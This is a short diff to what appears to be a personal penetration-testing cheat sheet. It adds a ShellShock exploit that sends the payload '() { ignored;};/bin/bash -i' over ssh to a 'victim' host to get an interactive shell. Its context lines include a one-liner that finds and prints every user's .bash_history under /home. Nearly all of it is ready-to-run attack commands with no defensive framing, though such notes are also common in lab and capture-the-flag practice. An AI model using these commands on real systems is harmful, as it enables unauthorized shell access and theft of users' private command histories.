@@ -9,6 +9,11 @@
 	2. Searching and Catting  .bash_history file contents
 		cat $(find /home -name ".bash_history")
 		
+# ShellShock exploitation with ssh command
+	1.  ssh -i noob noob@victim "() { ignored;};/bin/bash -i"
+		noob: private key file
+		string within "" is the payload
+		
 # Hash Cracking 
 
 	1. hash-identifier  
